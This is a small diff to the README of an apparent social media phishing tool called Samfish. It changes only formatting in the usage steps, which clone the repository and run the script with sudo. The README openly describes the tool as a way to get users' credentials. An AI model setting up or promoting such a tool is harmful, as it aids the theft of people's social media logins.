@@ -4,7 +4,7 @@ The ultimate social media phishing tool. using this tool you can get the credent
 git clone https://github.com/Munazirul/Samfish
 
 # Usage
-1. cd Samfish
+1. `cd Samfish`
 2. chmod +x samfish.sh
 3. sudo ./samfish.sh
 4. go go go !!!
